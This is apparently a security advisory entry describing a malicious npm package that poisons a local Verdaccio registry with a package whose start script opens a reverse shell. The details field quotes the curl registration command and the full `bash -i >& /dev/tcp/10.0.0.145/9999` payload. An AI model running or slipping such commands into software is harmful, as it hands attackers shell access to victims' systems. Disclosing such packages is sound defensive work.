summary: Package publishes reverse-shell payload to local npm registry when invoked
details: The package's sole export `command()` in index.js performs an attack flow against a local npm registry: it issues `curl -s -X PUT http://0.0.0.0:4873/-/user/org.couchdb.user:${USER}` to register/authenticate against a Verdaccio instance, writes basic-auth credentials to `/tmp/.npmrc_test`, and then publishes a package `uhclabs_local_check@1.0.5` whose `package.json` declares `scripts.start: "/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.145/9999 0>&1'"` — a reverse shell to 10.0.0.145:9999. The intent is to poison a local registry so any subsequent install or `npm start` of the seeded package opens an interactive shell back to the attacker-controlled host. The package has no README and no functionality beyond this payload; the `internallib_v557` name is a generic placeholder consistent with dependency-confusion staging against guessed internal package names. The harmful function does not run at require time, but the package ships as `main` with no other purpose, so any consumer who imports and calls it triggers the attack flow.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
